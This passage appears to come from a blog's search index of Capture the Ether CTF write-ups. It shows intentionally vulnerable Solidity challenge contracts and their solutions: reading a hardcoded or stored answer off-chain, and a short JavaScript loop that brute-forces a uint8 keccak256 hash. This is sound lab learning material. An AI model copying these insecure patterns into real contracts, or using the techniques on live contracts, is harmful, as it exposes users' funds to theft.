return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>the correct number is stored in the blockchain state (storage). we can get it off-chain.</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>call ethers’s function <code>getStorageAt()</code> to get the “answer” and then call <code>guess(uint8)</code></p>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.Guess the secret number</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/02.Guess%20the%20secret%20number/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/02.Guess%20the%20secret%20number/</url>
      
        <content type="html"><![CDATA[<h1 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a>Guess the secret number</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheSecretNumberChallenge &#123;</span><br><span class="line">    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function GuessTheSecretNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        if (keccak256(n) == answerHash) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>we need to guess a number which returns <code>0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</code> after keccak256(). we can brute force it because the type of guess numer is uint8 which means there are only 256 probabilities.</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>1.find the correct number off-chain</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;ethers,utils&#125; = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">main</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (utils.<span class="title function_">keccak256</span>([i]) == <span class="number">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`The secret number is <span class="subst">$&#123;i&#125;</span> and the hash is <span class="subst">$&#123;utils.keccak256([i])&#125;</span>`</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">main</span>()</span><br></pre></td></tr></table></figure><p><img src="/2023/06/23/01.Capturetheether%20CTF/02.Guess%20the%20secret%20number/image-20230308092214717.png" alt="image-20230308092214717"></p><p>2.call <code>guess(uint8)</code> with the parameter “170” and 1 ETH</p>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.Guess the number</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/01.Guess%20the%20number/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/01.Guess%20the%20number/</url>
      
        <content type="html"><![CDATA[<h1 id="Guess-the-number"><a href="#Guess-the-number" class="headerlink" title="Guess the number"></a>Guess the number</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumberChallenge &#123;</span><br><span class="line">    uint8 answer = 42;</span><br><span class="line"></span><br><span class="line">    function GuessTheNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p> It is easy to complete this level. We can see the answer “42”. So we dont need to guess.</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>call <code>guess(uint8)</code> with the parameter “42” and 1 ETH.</p>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.digest</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/00.digest/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/00.digest/</url>
      
        <content type="html"><![CDATA[<h1 id="digest"><a href="#digest" class="headerlink" title="digest"></a>digest</h1><ul><li>site：<a href="https://capturetheether.com/challenges/">https://capturetheether.com/challenges/</a></li><li>references：<ul><li><a href="https://cmichel.io/capture-the-ether-solutions/">https://cmichel.io/capture-the-ether-solutions/</a></li><li><a href="https://github.com/0xJuancito/capture-the-ether-solutions">https://github.com/0xJuancito/capture-the-ether-solutions</a></li><li><a href="https://dac.ac/blog/capture_the_ether_solutions/#submission-transaction">https://dac.ac/blog/capture_the_ether_solutions/#submission-transaction</a></li><li><a href="https://mirror.xyz/kyrers.eth/Ts7ip2vbWFHKh7gZQtAQwIdJ5e99QJnC8ITNIDtkHW8">https://mirror.xyz/kyrers.eth/Ts7ip2vbWFHKh7gZQtAQwIdJ5e99QJnC8ITNIDtkHW8</a></li></ul></li></ul><p>our goal is to make isComplete = true!</p>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
